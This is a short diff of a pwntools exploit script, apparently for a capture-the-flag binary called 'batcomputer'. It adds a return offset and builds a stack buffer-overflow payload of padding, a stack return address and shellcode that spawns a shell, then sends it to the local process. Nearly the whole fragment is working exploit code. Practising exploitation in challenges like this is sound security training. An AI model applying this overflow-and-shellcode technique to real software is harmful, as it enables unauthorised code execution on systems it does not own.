@@ -1,7 +1,11 @@
 
 from pwn import *
 
+#context.log_level = 'DEBUG'
+context(os='linux', arch='amd64')
+
 password = 'b4tp@$$w0rd!'
+ret_offset = 84
 
 log.info('Start Process')
 io = process('/home/kali/Downloads/batcomputer')
@@ -19,7 +23,9 @@ io.sendlineafter('> ', '2')
 io.sendlineafter('password: ', password)
 
 log.info('Send payload')
-payload = 'a' * 137
+padding = b'A' * ret_offset
+shellcode = asm(shellcraft.sh())
+payload = padding + p64(stack_address + ret_offset + 8) + shellcode
 io.sendlineafter('commands: ', payload)
 
 log.info('Trigger Return')
